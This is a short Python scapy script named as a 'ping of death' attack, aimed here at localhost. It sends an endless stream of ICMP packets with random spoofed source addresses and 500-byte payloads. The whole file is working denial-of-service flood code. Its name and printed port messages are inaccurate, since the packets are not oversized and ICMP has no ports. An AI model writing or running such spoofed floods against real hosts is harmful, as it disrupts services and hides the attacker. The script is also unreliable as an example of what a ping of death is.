from scapy.all import *
from scapy.layers.inet import IP, ICMP
import random
def ping_of_death(Ip,port):
    while True:
        srcaddr=RandIP()
        srcport=random.randint(0,65535)
        pkt=IP(dst=Ip,src=srcaddr)/ICMP()/(chr(random.randint(65,97))*500)
        print(raw(pkt))
        print("Sending packets to ",Ip,"at port",port)
        print("Source is set to ",srcaddr," at port",srcport)
        send(pkt)
ping_of_death("127.0.0.1",23)
